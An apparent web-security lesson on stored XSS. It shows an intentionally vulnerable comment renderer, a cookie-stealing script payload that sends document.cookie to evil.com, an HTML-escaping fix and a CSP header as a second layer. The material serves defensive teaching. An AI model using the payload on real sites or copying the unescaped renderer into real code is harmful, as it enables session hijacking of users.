---
title: "L3 — The Scenario's stored XSS, the sanitization fix, and a CSP as a second layer"
---

## The vulnerable renderer, and what the injected comment actually produces

**Here's the Scenario's comment renderer. What does it do when given
the malicious comment?**

```js
function renderCommentVulnerable(comment) {
  return `<div class="comment">${comment.text}</div>`;
}
```

```js
const maliciousComment = {
  text: '<script>document.location="https://evil.com/steal?cookie="+document.cookie</script>',
};

renderCommentVulnerable(maliciousComment);
// '<div class="comment"><script>document.location="https://evil.com/steal?cookie="+document.cookie</script></div>'
```

The function inserts `comment.text` directly into the HTML string
with no transformation at all. Whatever the comment contains becomes
part of the actual markup — a `<script>` tag in the comment becomes a
real, executable `<script>` tag in the rendered page. When a
browser parses this HTML, it doesn't know or care that the tag came
from user input; it just runs it, with access to that page's cookies
(`document.cookie`), which is exactly the mechanism the Scenario
describes.

## The fix: escape, don't insert

**How does escaping the content prevent the script from executing?**

```js
function escapeHtml(str) {
  return str
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;")
    .replace(/'/g, "&#39;");
}

function renderCommentFixed(comment) {
  return `<div class="comment">${escapeHtml(comment.text)}</div>`;
}
```

```js
renderCommentFixed(maliciousComment);
// '<div class="comment">&lt;script&gt;document.location=&quot;https://evil.com/steal?cookie=&quot;+document.cookie&lt;/script&gt;</div>'
```

`escapeHtml` replaces the characters that give HTML its structural
meaning (`<`, `>`, `"`, `'`, `&`) with their literal text
equivalents. The browser now sees `&lt;script&gt;` — the literal
_text_ "`<script>`" — rather than an actual opening tag, so it
renders as visible text on the page instead of executing as code.
The comment's content is preserved exactly (the visitor sees the
literal text the attacker typed), but it can never be interpreted as
markup, which is the entire point: user input is data, never code,
once escaped.

**Would checking for the word "script" and rejecting comments that
contain it work as well as escaping?** No — that's a much weaker
defense (a blocklist), and it's easy to bypass with different
attack vectors that don't contain the literal word "script" at all
(event handler attributes, other tags). Escaping structural characters
is what actually closes the underlying mechanism, regardless of what
specific attack syntax is used.

## CSP as a second, independent layer

**Suppose a different bug somewhere still let an unescaped script
through. What would a Content Security Policy do about it?**

```js
function buildCspHeader(policy) {
  return Object.entries(policy)
    .map(([directive, sources]) => `${directive} ${sources.join(" ")}`)
    .join("; ");
}
```

```js
buildCspHeader({
  "default-src": ["'self'"],
  "script-src": ["'self'", "https://cdn.example.com"],
});
// "default-src 'self'; script-src 'self' https://cdn.example.com"
```

Sent as an HTTP header, this tells the browser: only run scripts that
come from this site itself or from the named CDN. An injected inline
`<script>` tag (like the Scenario's) has no external source at all —
under a policy like this, without also allowing `'unsafe-inline'`,
the browser refuses to execute it, even if it somehow ended up in the
page's HTML. This is precisely the "second layer" from L2: CSP
doesn't need to know anything about comments or sanitization — it's
a blanket browser-enforced rule that limits what any script,
injected or not, is allowed to do.

## What generalizes and what doesn't

The core lesson — user input rendered into a page must always be
treated as inert data, never as executable markup, and a
browser-enforced policy provides a genuinely independent second layer
in case that first defense ever fails — generalizes to any place
user content gets displayed: search results, user profiles, chat
messages, file names. What's specific to this worked example: the
exact `escapeHtml` implementation handles this specific rendering
context (inserting text into an HTML element's body) — a different
context (inserting user data into an HTML _attribute_, or into a
`<script>` block, or into a URL) needs a different, context-specific
escaping approach, since the characters that matter structurally
differ by context. **Try extending it yourself:** if a comment's
author name were inserted into an HTML attribute instead of the
element's text content (e.g., `<div title="${comment.author}">`),
would the same `escapeHtml` function used here be sufficient, or does
attribute context introduce a different injection risk that needs
its own handling?

## Failure modes

| Failure mode                                                                            | What it gets wrong                                                                                                                                                                |
| --------------------------------------------------------------------------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| Using a keyword blocklist ("reject if it contains 'script'") instead of escaping        | Blocklists are trivially bypassed by attack syntax that doesn't match the specific blocked keyword — escaping structural characters closes the actual mechanism                   |
| Sanitizing only content that's permanently stored, not reflected input                  | Reflected XSS shows that any unescaped user input echoed back into a page is dangerous, whether or not it's ever saved                                                            |
| Treating CSP as sufficient on its own, without sanitizing displayed content             | CSP restricts what a script can do and where it can load from — it isn't a reliable substitute for preventing the injection in the first place                                    |
| Applying the same escaping function to every rendering context without checking it fits | HTML-body escaping, attribute escaping, and JavaScript-string escaping protect against different structural characters — using the wrong one for the context can leave a real gap |
